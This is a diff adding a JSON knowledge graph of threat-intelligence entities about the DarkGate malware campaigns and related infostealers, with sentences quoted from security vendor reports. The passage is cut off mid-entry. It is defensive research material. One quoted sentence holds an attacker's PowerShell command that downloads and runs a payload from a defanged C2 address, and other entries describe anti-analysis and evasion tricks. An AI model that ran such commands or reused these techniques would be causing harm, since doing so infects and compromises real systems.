@@ -1,0 +1,4104 @@
+{
+  "nodes": {
+    "high_level": [
+      {
+        "node_id": "HL_001424583ef1",
+        "node_class": "high_level",
+        "node_type": "Location",
+        "node_text": "India",
+        "edges": [],
+        "source": {
+          "India_labs.withsecure.com_publications_darkgate-malware-campaign": [
+            [
+              4,
+              "WithSecure Detection and Response Team (DRT) detected and identified multiple DarkGate malware infection attempts against WithSecure Managed Detection and Response (MDR) customers in the UK, US, and India."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_017c8c7325b4",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Google Drive",
+        "edges": [
+          "EDGE_5d2998355e15"
+        ],
+        "source": {
+          "Google Drive_labs.withsecure.com_publications_darkgate-malware-campaign": [
+            [
+              12,
+              "Analysis of browser history on a victim device identified that the initial vector was a LinkedIn message which directed the victim to hxxps://g2[.]by/jd-Corsair, which then redirected the victim to a file hosted on Google Drive."
+            ],
+            [
+              26,
+              "The g2[.]by/jd-Corsair redirect has been changed by the actor over time, at one point redirecting visitors to a file hosted on Google Drive, then at another time redirecting to a file hosted on Dropbox."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_0607bb9bb168",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Dropbox",
+        "edges": [
+          "EDGE_c4afabd72079"
+        ],
+        "source": {
+          "Dropbox_labs.withsecure.com_publications_darkgate-malware-campaign": [
+            [
+              26,
+              "The g2[.]by/jd-Corsair redirect has been changed by the actor over time, at one point redirecting visitors to a file hosted on Google Drive, then at another time redirecting to a file hosted on Dropbox."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_1acf563eb8bf",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "WithSecure",
+        "edges": [],
+        "source": {
+          "WithSecure_labs.withsecure.com_publications_darkgate-malware-campaign": [
+            [
+              4,
+              "WithSecure Detection and Response Team (DRT) detected and identified multiple DarkGate malware infection attempts against WithSecure Managed Detection and Response (MDR) customers in the UK, US, and India."
+            ],
+            [
+              8,
+              "The WithSecure Intelligence report on Ducktail and Duckport is strongly recommended reading."
+            ],
+            [
+              10,
+              "On 2023.08.04 WithSecure Managed Detection and Response identified suspicious code injection into multiple processes on a customer endpoint."
+            ],
+            [
+              48,
+              "The original C2 IP address of the Corsair campaign, hxxp://149.248.0[.]82:2351/, has been associated with a number of files from many different campaigns in VirusTotal."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_2b260171a6c9",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "DarkGate",
+        "edges": [
+          "EDGE_66b3e3443dfe",
+          "EDGE_68981a58e34e",
+          "EDGE_95399637fb1d",
+          "EDGE_d5c2cb520fc7",
+          "EDGE_f278f73b7f7c",
+          "EDGE_247e159a0a7b",
+          "EDGE_3e71bc52f830",
+          "EDGE_4880b64ed41e",
+          "EDGE_4ff17eaa267a",
+          "EDGE_503e22895c06",
+          "EDGE_6c4003b26fca",
+          "EDGE_9d355464b6cc",
+          "EDGE_db63c64b77af",
+          "EDGE_3ffa7ef2c7d9",
+          "EDGE_8b7ac22421b8",
+          "EDGE_bbe10a5dde11",
+          "EDGE_fe71ab0d9472",
+          "EDGE_a236a2581008",
+          "EDGE_e332f70508b6",
+          "EDGE_ff420cce3530"
+        ],
+        "source": {
+          "DarkGate_labs.withsecure.com_publications_darkgate-malware-campaign": [
+            [
+              4,
+              "WithSecure Detection and Response Team (DRT) detected and identified multiple DarkGate malware infection attempts against WithSecure Managed Detection and Response (MDR) customers in the UK, US, and India."
+            ],
+            [
+              5,
+              "It rapidly became apparent that the lure documents and targeting were very similar to recent DuckTail infostealer campaigns, and it was possible to pivot through opensource data from the DarkGate campaign to multiple other infostealers which are very likely being used by the same actor/group."
+            ],
+            [
+              7,
+              "There have been multiple reports in Q3 2023 about DarkGate, the closely related Ducktail campaigns, and the Vietnamese threat actor cluster responsible for these campaigns."
+            ],
+            [
+              14,
+              "Very similar campaign themes and lures have been used to deliver Ducktail and DarkGate."
+            ],
+            [
+              19,
+              "DarkGate however appears to be a RAT with infostealer functionality."
+            ],
+            [
+              20,
+              "DarkGate attempts to be stealthy, it tries to achieve persistence, it has been used for a variety of purposes, and has reportedly been used by attackers to deploy Cobalt Strike and ransomware."
+            ],
+            [
+              21,
+              "It very much appears that DarkGate has a much more diverse user base than Ducktail, with much more varied goals."
+            ],
+            [
+              22,
+              "As such however, while DarkGate is a tool which is used by and useful to multiple unrelated actors, the DarkGate behavior which most closely resembles and overlaps with the Ducktail campaigns is likely to be the same Vietnamese threat actor cluster."
+            ],
+            [
+              30,
+              "Some reporting has shown that it has been distributed through AutoIT scripts, as have other Infostealers, however the method of distribution in that case is very different to the DarkGate use of AutoIT, and seems rather more technically advanced."
+            ],
+            [
+              31,
+              "The most recent reporting on Redline stealer also seems to describe a more technically skilled campaign than the DarkGate activity that we observed, however Redline stealer is a MaaS, and so just like DarkGate there will be multiple threat actors running campaigns using the same malware in different ways."
+            ],
+            [
+              41,
+              "There are a number of LNK files in VirusTotal which execute commands to connect to DarkGate C2 servers, and some of these files have the same Drive ID field, indicating they were created on the same device/hard drive."
+            ],
+            [
+              51,
+              "A random subset of these were inspected and all were identified as DarkGate related."
+            ]
+          ],
+          "DarkGate_unit42.paloaltonetworks.com_darkgate-malware-uses-excel-files": [
+            [
+              0,
+              "This article reviews a DarkGate malware campaign from March-April 2024 that uses Microsoft Excel files to download a malicious software package from public-facing SMB file shares."
+            ],
+            [
+              2,
+              "First reported in 2018, DarkGate has evolved into a malware-as-a-service (MaaS) offering."
+            ],
+            [
+              3,
+              "We have seen a surge of DarkGate activity after the disruption of Qakbot infrastructure in August 2023."
+            ],
+            [
+              4,
+              "DarkGate has since evolved to become a MaaS offering with a tightly controlled number of customers."
+            ],
+            [
+              5,
+              "DarkGate has advertised various capabilities including hidden virtual network computing (hVNC), remote code execution, cryptomining and reverse shell."
+            ],
+            [
+              6,
+              "DarkGate remained relatively under the radar until 2021."
+            ],
+            [
+              7,
+              "Our telemetry revealed a surge in DarkGate starting in September 2023 (shown in Figure 2), not too long after the multinational government disruption and takedown of Qakbot infrastructure in August 2023."
+            ],
+            [
+              8,
+              "These campaigns use AutoIt or AutoHotkey scripts to infect victims with DarkGate."
+            ],
+            [
+              10,
+              "Starting in March 2024, we saw a campaign using servers running open Samba file shares hosting files used for DarkGate infections."
+            ],
+            [
+              12,
+              "In March 2024, the actors behind DarkGate began a new campaign using Microsoft Excel (.xlsx) files, which mostly targeted North America in the beginning but slowly spread to Europe as well as parts of Asia."
+            ],
+            [
+              17,
+              "This PowerShell script downloads three files and uses them to start the AutoHotKey-based DarkGate package."
+            ],
+            [
+              23,
+              "This file is the final shellcode for DarkGate, but it is obfuscated."
+            ],
+            [
+              24,
+              "One of the anti-analysis techniques employed by DarkGate is identifying the CPU of the targeted system."
+            ],
+            [
+              25,
+              "This can reveal if the threat is running in a virtual environment or on a physical host, enabling DarkGate to cease operations to avoid being analyzed in a controlled environment."
+            ],
+            [
+              26,
+              "In addition to checking CPU information, DarkGate malware also scans for multiple other anti-malware programs on the targeted system."
+            ],
+            [
+              27,
+              "By identifying installed anti-malware software, DarkGate can avoid triggering their detection mechanisms or even disable them to further evade analysis."
+            ],
+            [
+              28,
+              "As DarkGate has evolved, its developers have implemented updates to include new anti-malware checks, such as those for Windows Defender and SentinelOne."
+            ],
+            [
+              30,
+              "DarkGate malware not only checks for CPU information and anti-malware programs but also scans the host's running processes."
+            ],
+            [
+              32,
+              "After gathering information about the targeted system's hardware, anti-malware programs and running processes, DarkGate malware incorporates this data into its decryption routine for its configuration."
+            ],
+            [
+              34,
+              "In the most recent versions of DarkGate, the function to decrypt the configuration receives the encrypted buffer, buffer size and a hard-coded XOR key as inputs."
+            ],
+            [
+              36,
+              "We recently analyzed the configurations from DarkGate malware samples from a variety of campaigns."
+            ],
+            [
+              41,
+              "Despite these unknown field values, the configuration data can reveal interesting details of DarkGate samples."
+            ],
+            [
+              42,
+              "DarkGate C2 traffic uses unencrypted HTTP requests, but the data is obfuscated and appears as Base64-encoded text."
+            ],
+            [
+              49,
+              "DarkGate malware represents a significant and adaptable threat in the cybercrime ecosystem, possibly filling the gap left by the dismantlement of Qakbot after August 2023."
+            ],
+            [
+              50,
+              "With its multi-faceted attack vectors and evolution into a full-fledged MaaS offering, DarkGate demonstrates a high level of complexity and persistence."
+            ],
+            [
+              52,
+              "As DarkGate continues to evolve and refine its methods of infiltration and resistance to analysis, it remains a potent reminder of the need for robust and proactive cybersecurity defenses."
+            ]
+          ],
+          "DarkGate_www.sonicwall.com_blog_disarming-darkgate-a-deep-dive-into-thwarting-the-latest-darkgate-variant": [
+            [
+              5,
+              "It concatenates hexadecimal encoded strings of shellcode bytes, which are followed by the DarkGate loader binary bytes."
+            ],
+            [
+              7,
+              "The shellcode enumerates PE headers of the DarkGate loader binary, which is followed by the shellcode bytes to get the address of the entry point."
+            ],
+            [
+              8,
+              "Execution is now transferred to the DarkGate loader entry point, and the 0x20th byte in the DOS header of the loader binary is updated to the value “2” to prevent re-execution of the loader binary in the next callback to the shellcode."
+            ],
+            [
+              9,
+              "The shellcode is registered as a callback function, and the updated value of the 0x20th byte in the DOS header helps to prevent multi-instances execution for the DarkGate loader."
+            ],
+            [
+              10,
+              "The loader reads the script file and retrieves the encrypted DarkGate bytes using the marker value “GDrdcpJy.” The malware decrypts the DarkGate binary with the key “GDrdcpJy” using the EncryptDecrypt algorithm, which is explained in the malware initialization section."
+            ],
+            [
+              11,
+              "The malware now loads the DarkGate binary in memory and transfers execution control to it."
+            ],
+            [
+              12,
+              "Malware execution starts with initializing the version value “6.6” for the DarkGate variant."
+            ],
+            [
+              26,
+              "The malware also checks for the presence of the directory “c:\\debug” to display a debug message with the DarkGate version number."
+            ],
+            [
+              30,
+              "The malware decrypts the DarkGate binary with the key value \"GDrdcpJy\" from field data 27 using the EncryptDecrypt algorithm."
+            ],
+            [
+              31,
+              "The key value also works as a marker to retrieve the encrypted DarkGate bytes from the AU3 script file."
+            ]
+          ],
+          "DarkGate_www.trendmicro.com_en_us_research_24_l_darkgate-malware.html": [
+            [
+              1,
+              "This led to the user being instructed to download the remote desktop application AnyDesk, which then facilitated the deployment of DarkGate malware."
+            ],
+            [
+              2,
+              "DarkGate, distributed via an AutoIt script, enabled remote control over the user's machine, executed malicious commands, gathered system information, and connected to a command-and-control server."
+            ],
+            [
+              18,
+              "This process is used as a proxy to load and execute the DarkGate script into memory."
+            ],
+            [
+              25,
+              "The said event was accompanied by the execution of a PowerShell command that dropped the DarkGate payload:\nobjectCmd: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -Command Invoke-Expression (Invoke-RestMethod -Uri hxxp://179.60.149[.]194:8080/fdgjsdmt)\nThe command above will attempt to download fdgjsdmt from hxxp://179.60.149[.]194:8080 and execute it with the following content:."
+            ],
+            [
+              36,
+              "DarkGate is primarily distributed through phishing emails, malvertising and SEO poisoning."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_3c9e3682cbfd",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "VirusTotal",
+        "edges": [],
+        "source": {
+          "VirusTotal_labs.withsecure.com_publications_darkgate-malware-campaign": [
+            [
+              25,
+              "Searching for the string “corsair-JD” in VirusTotal identified multiple files that reference that URL, including a Zip, PDF, TXT, and DOCX file."
+            ],
+            [
+              41,
+              "There are a number of LNK files in VirusTotal which execute commands to connect to DarkGate C2 servers, and some of these files have the same Drive ID field, indicating they were created on the same device/hard drive."
+            ],
+            [
+              45,
+              "While at first glance “job description*.zip” may seem a weak identifier, it appears that very few legitimate job descriptions are distributed as zip files, and it is likely that even fewer are then uploaded to Virustotal."
+            ],
+            [
+              48,
+              "The original C2 IP address of the Corsair campaign, hxxp://149.248.0[.]82:2351/, has been associated with a number of files from many different campaigns in VirusTotal."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_4e256872467b",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "Lobshot",
+        "edges": [],
+        "source": {
+          "Lobshot_labs.withsecure.com_publications_darkgate-malware-campaign": [
+            [
+              49,
+              "Many of the files appear to be paired, i.e.:\nhxxp://149.248.0[.]82:2351/msiyfucokvo | hxxp://149.248.0[.]82:2351/yfucokvo |\n\nLobshot malware\nAmong the files that communicate with this C2 IP is OppyVYah.exe (a5cccdf086c63bea47a509c683e7b4214d1a2be0522fc835788887117e92d41a), which is identified as Lobshot, a malware with remote access capabilities."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_529ecb0954cb",
+        "node_class": "high_level",
+        "node_type": "Sector",
+        "node_text": "digital marketing sector",
+        "edges": [],
+        "source": {
+          "digital marketing sector_labs.withsecure.com_publications_darkgate-malware-campaign": [
+            [
+              0,
+              "Vietnamese cybercrime groups are using multiple different Malware as a Service (MaaS) infostealers and Remote Access Trojans (RATs) to target the digital marketing sector."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_6120e967f906",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Facebook",
+        "edges": [],
+        "source": {
+          "Facebook_labs.withsecure.com_publications_darkgate-malware-campaign": [
+            [
+              1,
+              "These actors greatly value Facebook business accounts and hijacking these accounts appears to be one of their primary goals."
+            ],
+            [
+              17,
+              "It has an additional Facebook Business account focused function whereby if it locates a Facebook Business account session cookie it will attempt to add the attacker to the account as an administrator, and even has functionality to automatically create and publish fraudulent ad campaigns sent by the actor to the compromised device."
+            ],
+            [
+              18,
+              "This additional, heavily Facebook focused functionality is still based around Infostealing, though it suggests a very tight focus for the attacker."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_6389a383bed8",
+        "node_class": "high_level",
+        "node_type": "Location",
+        "node_text": "US",
+        "edges": [],
+        "source": {
+          "US_labs.withsecure.com_publications_darkgate-malware-campaign": [
+            [
+              4,
+              "WithSecure Detection and Response Team (DRT) detected and identified multiple DarkGate malware infection attempts against WithSecure Managed Detection and Response (MDR) customers in the UK, US, and India."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_64f65f6fc638",
+        "node_class": "high_level",
+        "node_type": "Tool",
+        "node_text": "Cobalt Strike",
+        "edges": [],
+        "source": {
+          "Cobalt Strike_labs.withsecure.com_publications_darkgate-malware-campaign": [
+            [
+              20,
+              "DarkGate attempts to be stealthy, it tries to achieve persistence, it has been used for a variety of purposes, and has reportedly been used by attackers to deploy Cobalt Strike and ransomware."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_856a5e2e4897",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "Redline stealer",
+        "edges": [
+          "EDGE_9338665c4c95"
+        ],
+        "source": {
+          "Redline stealer_labs.withsecure.com_publications_darkgate-malware-campaign": [
+            [
+              27,
+              "Pivoting on the author ID of the Leader Marketing Job-Description.pdf file finds a Redline stealer executable named license.txt_, which contains the exact same Leader Marketing Job-Description.pdf file."
+            ],
+            [
+              29,
+              "Redline stealer was first reported in early 2020 as an MaaS infostealer, and has remained active since then."
+            ],
+            [
+              31,
+              "The most recent reporting on Redline stealer also seems to describe a more technically skilled campaign than the DarkGate activity that we observed, however Redline stealer is a MaaS, and so just like DarkGate there will be multiple threat actors running campaigns using the same malware in different ways."
+            ],
+            [
+              33,
+              "There are some big giveaways amongst the communicating files for this IP address that tell us it is related to our actor, and to Redline stealer, such as the file Redline.exe."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_8b35cf3290ab",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "LinkedIn",
+        "edges": [
+          "EDGE_21aa7c202a2e"
+        ],
+        "source": {
+          "LinkedIn_labs.withsecure.com_publications_darkgate-malware-campaign": [
+            [
+              12,
+              "Analysis of browser history on a victim device identified that the initial vector was a LinkedIn message which directed the victim to hxxps://g2[.]by/jd-Corsair, which then redirected the victim to a file hosted on Google Drive."
+            ],
+            [
+              13,
+              "The initial infection vector being via a LinkedIn message is a typical method seen by WithSecure Intelligence in DuckTail campaigns, and Ducktail appears to be used by a cluster of different yet related Vietnamese threat actors."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_955596d286ce",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "DuckTail",
+        "edges": [
+          "EDGE_02c9a10f4a92",
+          "EDGE_566f75f9b654",
+          "EDGE_ec046239d9b9"
+        ],
+        "source": {
+          "DuckTail_labs.withsecure.com_publications_darkgate-malware-campaign": [
+            [
+              5,
+              "It rapidly became apparent that the lure documents and targeting were very similar to recent DuckTail infostealer campaigns, and it was possible to pivot through opensource data from the DarkGate campaign to multiple other infostealers which are very likely being used by the same actor/group."
+            ],
+            [
+              8,
+              "The WithSecure Intelligence report on Ducktail and Duckport is strongly recommended reading."
+            ],
+            [
+              9,
+              "It is a very thorough report on Ducktail, with large amounts of technical detail and observations about the tools, their evolution, and the campaigns they have been used in."
+            ],
+            [
+              13,
+              "The initial infection vector being via a LinkedIn message is a typical method seen by WithSecure Intelligence in DuckTail campaigns, and Ducktail appears to be used by a cluster of different yet related Vietnamese threat actors."
+            ],
+            [
+              15,
+              "Ducktail has been reported on previously by WithSecure and others and is almost certainly an infostealer that is employed by a cluster of actors based in Vietnam."
+            ],
+            [
+              16,
+              "Ducktail is a dedicated infostealer, it is in no way stealthy, and upon execution it will rapidly steal credentials and session cookies from the local device and send them back to the attacker."
+            ],
+            [
+              22,
+              "As such however, while DarkGate is a tool which is used by and useful to multiple unrelated actors, the DarkGate behavior which most closely resembles and overlaps with the Ducktail campaigns is likely to be the same Vietnamese threat actor cluster."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_9a4eefa2008d",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "Corsair",
+        "edges": [],
+        "source": {
+          "Corsair_labs.withsecure.com_publications_darkgate-malware-campaign": [
+            [
+              23,
+              "The infection attempt that was initially detected used a lure that claimed to relate to the computer memory and hardware manufacturer Corsair."
+            ],
+            [
+              44,
+              "Many URLs are short random strings with a similar format, but some include specific strings that tie back into the Corsair lure DarkGate campaign, or to similar campaigns that use different organisations as lures."
+            ],
+            [
+              47,
+              "As well as the familiar bundle and filename format, this VBS file also connects to the original Corsair campaign C2 address, hxxp://149.248.0[.]82:2351/."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_a7c8489ac277",
+        "node_class": "high_level",
+        "node_type": "Location",
+        "node_text": "UK",
+        "edges": [],
+        "source": {
+          "UK_labs.withsecure.com_publications_darkgate-malware-campaign": [
+            [
+              4,
+              "WithSecure Detection and Response Team (DRT) detected and identified multiple DarkGate malware infection attempts against WithSecure Managed Detection and Response (MDR) customers in the UK, US, and India."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_ed027fcc1345",
+        "node_class": "high_level",
+        "node_type": "Location",
+        "node_text": "Vietnam",
+        "edges": [],
+        "source": {
+          "Vietnam_labs.withsecure.com_publications_darkgate-malware-campaign": [
+            [
+              15,
+              "Ducktail has been reported on previously by WithSecure and others and is almost certainly an infostealer that is employed by a cluster of actors based in Vietnam."
+            ],
+            [
+              43,
+              "This is a Vietnamese URL shortener service and is likely to be more heavily used by people in Vietnam."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_153928bf9609",
+        "node_class": "high_level",
+        "node_type": "Tool",
+        "node_text": "PowerShell",
+        "edges": [
+          "EDGE_1bcf824222e5",
+          "EDGE_40422d3334f9"
+        ],
+        "source": {
+          "PowerShell_unit42.paloaltonetworks.com_darkgate-malware-uses-excel-files": [
+            [
+              16,
+              "Code from the .vbs or .js file downloads and runs a PowerShell script."
+            ],
+            [
+              17,
+              "This PowerShell script downloads three files and uses them to start the AutoHotKey-based DarkGate package."
+            ],
+            [
+              18,
+              "In some cases, these PowerShell scripts attempt an interesting evasion tactic."
+            ],
+            [
+              19,
+              "Below in Figure 8, we find an example of a PowerShell script that checks if Kaspersky anti-malware software is installed by detecting if the directory C:/ProgramData/Kaspersky Lab exists."
+            ],
+            [
+              20,
+              "If this directory exists, the PowerShell script downloads the legitimate AutoHotKey.exe, possibly as an evasion tactic to avoid triggering Kaspersky anti-malware."
+            ],
+            [
+              21,
+              "If C:/ProgramData/Kaspersky Lab does not exist, the PowerShell script downloads ASCII text representing hexadecimal code for Autohotkey.exe, saves the result as a.bin and uses certutil.exe with the -decodehex parameter to decode a.bin to the AutoHotKey.exe binary."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_2b1fb50a5d68",
+        "node_class": "high_level",
+        "node_type": "Location",
+        "node_text": "North America",
+        "edges": [],
+        "source": {
+          "North America_unit42.paloaltonetworks.com_darkgate-malware-uses-excel-files": [
+            [
+              9,
+              "Our telemetry indicates this activity has been widespread across North America and Europe as well as significant portions of Asia."
+            ],
+            [
+              12,
+              "In March 2024, the actors behind DarkGate began a new campaign using Microsoft Excel (.xlsx) files, which mostly targeted North America in the beginning but slowly spread to Europe as well as parts of Asia."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_2e9e1d15ef40",
+        "node_class": "high_level",
+        "node_type": "Location",
+        "node_text": "Europe",
+        "edges": [],
+        "source": {
+          "Europe_unit42.paloaltonetworks.com_darkgate-malware-uses-excel-files": [
+            [
+              9,
+              "Our telemetry indicates this activity has been widespread across North America and Europe as well as significant portions of Asia."
+            ],
+            [
+              12,
+              "In March 2024, the actors behind DarkGate began a new campaign using Microsoft Excel (.xlsx) files, which mostly targeted North America in the beginning but slowly spread to Europe as well as parts of Asia."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_4404020f3489",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "SentinelOne",
+        "edges": [
+          "EDGE_677fceb3187f"
+        ],
+        "source": {
+          "SentinelOne_unit42.paloaltonetworks.com_darkgate-malware-uses-excel-files": [
+            [
+              28,
+              "As DarkGate has evolved, its developers have implemented updates to include new anti-malware checks, such as those for Windows Defender and SentinelOne."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_4df73dcd8785",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Microsoft Excel",
+        "edges": [
+          "EDGE_5fc10c51cc86"
+        ],
+        "source": {
+          "Microsoft Excel_unit42.paloaltonetworks.com_darkgate-malware-uses-excel-files": [
+            [
+              0,
+              "This article reviews a DarkGate malware campaign from March-April 2024 that uses Microsoft Excel files to download a malicious software package from public-facing SMB file shares."
+            ],
+            [
+              12,
+              "In March 2024, the actors behind DarkGate began a new campaign using Microsoft Excel (.xlsx) files, which mostly targeted North America in the beginning but slowly spread to Europe as well as parts of Asia."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_5e1b1e1af3d1",
+        "node_class": "high_level",
+        "node_type": "Location",
+        "node_text": "Asia",
+        "edges": [],
+        "source": {
+          "Asia_unit42.paloaltonetworks.com_darkgate-malware-uses-excel-files": [
+            [
+              9,
+              "Our telemetry indicates this activity has been widespread across North America and Europe as well as significant portions of Asia."
+            ],
+            [
+              12,
+              "In March 2024, the actors behind DarkGate began a new campaign using Microsoft Excel (.xlsx) files, which mostly targeted North America in the beginning but slowly spread to Europe as well as parts of Asia."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_5f11979935de",
+        "node_class": "high_level",
+        "node_type": "Tool",
+        "node_text": "certutil.exe",
+        "edges": [
+          "EDGE_f42f44553c7b"
+        ],
+        "source": {
+          "certutil.exe_unit42.paloaltonetworks.com_darkgate-malware-uses-excel-files": [
+            [
+              21,
+              "If C:/ProgramData/Kaspersky Lab does not exist, the PowerShell script downloads ASCII text representing hexadecimal code for Autohotkey.exe, saves the result as a.bin and uses certutil.exe with the -decodehex parameter to decode a.bin to the AutoHotKey.exe binary."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_6f2ac82a2560",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Windows Defender",
+        "edges": [
+          "EDGE_04e7ed5f3537"
+        ],
+        "source": {
+          "Windows Defender_unit42.paloaltonetworks.com_darkgate-malware-uses-excel-files": [
+            [
+              28,
+              "As DarkGate has evolved, its developers have implemented updates to include new anti-malware checks, such as those for Windows Defender and SentinelOne."
+            ]
+          ],
+          "Windows Defender_www.sonicwall.com_blog_disarming-darkgate-a-deep-dive-into-thwarting-the-latest-darkgate-variant": [
+            [
+              16,
+              "If the malware does not find any security software, then it considers the presence of Windows Defender and initializes the flag and name values accordingly."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_76ee56ab7ffc",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "Qakbot",
+        "edges": [],
+        "source": {
+          "Qakbot_unit42.paloaltonetworks.com_darkgate-malware-uses-excel-files": [
+            [
+              3,
+              "We have seen a surge of DarkGate activity after the disruption of Qakbot infrastructure in August 2023."
+            ],
+            [
+              7,
+              "Our telemetry revealed a surge in DarkGate starting in September 2023 (shown in Figure 2), not too long after the multinational government disruption and takedown of Qakbot infrastructure in August 2023."
+            ],
+            [
+              49,
+              "DarkGate malware represents a significant and adaptable threat in the cybercrime ecosystem, possibly filling the gap left by the dismantlement of Qakbot after August 2023."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_81e5de6d7e37",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "Danabot",
+        "edges": [],
+        "source": {
+          "Danabot_unit42.paloaltonetworks.com_darkgate-malware-uses-excel-files": [
+            [
+              47,
+              "While we've seen indicators of data exfiltration from DarkGate C2 traffic, other sources have reported follow-up malware from DarkGate like Danabot."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_bf47d8fe871b",
+        "node_class": "high_level",
+        "node_type": "Tool",
+        "node_text": "AutoHotkey",
+        "edges": [
+          "EDGE_1e62bad5f3ee",
+          "EDGE_3623380b8d0a"
+        ],
+        "source": {
+          "AutoHotkey_unit42.paloaltonetworks.com_darkgate-malware-uses-excel-files": [
+            [
+              8,
+              "These campaigns use AutoIt or AutoHotkey scripts to infect victims with DarkGate."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_d236b61c22be",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Samba",
+        "edges": [
+          "EDGE_3713586ec5e6"
+        ],
+        "source": {
+          "Samba_unit42.paloaltonetworks.com_darkgate-malware-uses-excel-files": [
+            [
+              10,
+              "Starting in March 2024, we saw a campaign using servers running open Samba file shares hosting files used for DarkGate infections."
+            ],
+            [
+              15,
+              "This URL points to a Samba/SMB share that is publicly accessible and hosts a VBS file."
+            ],
+            [
+              51,
+              "Campaigns using this malware exhibit advanced infection techniques, leveraging both phishing strategies and approaches like exploiting publicly accessible Samba shares."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_e9d824b93ac2",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Kaspersky anti-malware software",
+        "edges": [
+          "EDGE_e108730fdcdf",
+          "EDGE_e469988e3784"
+        ],
+        "source": {
+          "Kaspersky anti-malware software_unit42.paloaltonetworks.com_darkgate-malware-uses-excel-files": [
+            [
+              19,
+              "Below in Figure 8, we find an example of a PowerShell script that checks if Kaspersky anti-malware software is installed by detecting if the directory C:/ProgramData/Kaspersky Lab exists."
+            ],
+            [
+              20,
+              "If this directory exists, the PowerShell script downloads the legitimate AutoHotKey.exe, possibly as an evasion tactic to avoid triggering Kaspersky anti-malware."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_08e97f1f2fcd",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Process Explorer",
+        "edges": [
+          "EDGE_66240d55c988"
+        ],
+        "source": {
+          "Process Explorer_www.sonicwall.com_blog_disarming-darkgate-a-deep-dive-into-thwarting-the-latest-darkgate-variant": [
+            [
+              28,
+              "The malware runs in a 100 milliseconds sleep loop for 40 times in which foreground window text is checked for strings \"process hacker\" or \"process explorer,\" and if it does not match, the malware exits from the loop."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_2a1f9689a7fe",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Process Hacker",
+        "edges": [
+          "EDGE_484f3393a76c"
+        ],
+        "source": {
+          "Process Hacker_www.sonicwall.com_blog_disarming-darkgate-a-deep-dive-into-thwarting-the-latest-darkgate-variant": [
+            [
+              27,
+              "Malware delays execution for some time if the user is focused on the Process Hacker or Process Monitor window, to avoid malicious activity observation from the user."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_326ac4276ba9",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Process Monitor",
+        "edges": [
+          "EDGE_69884df40331"
+        ],
+        "source": {
+          "Process Monitor_www.sonicwall.com_blog_disarming-darkgate-a-deep-dive-into-thwarting-the-latest-darkgate-variant": [
+            [
+              27,
+              "Malware delays execution for some time if the user is focused on the Process Hacker or Process Monitor window, to avoid malicious activity observation from the user."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_a4b288fde332",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "AutoIt3",
+        "edges": [
+          "EDGE_f59cba8c5f27"
+        ],
+        "source": {
+          "AutoIt3_www.sonicwall.com_blog_disarming-darkgate-a-deep-dive-into-thwarting-the-latest-darkgate-variant": [
+            [
+              3,
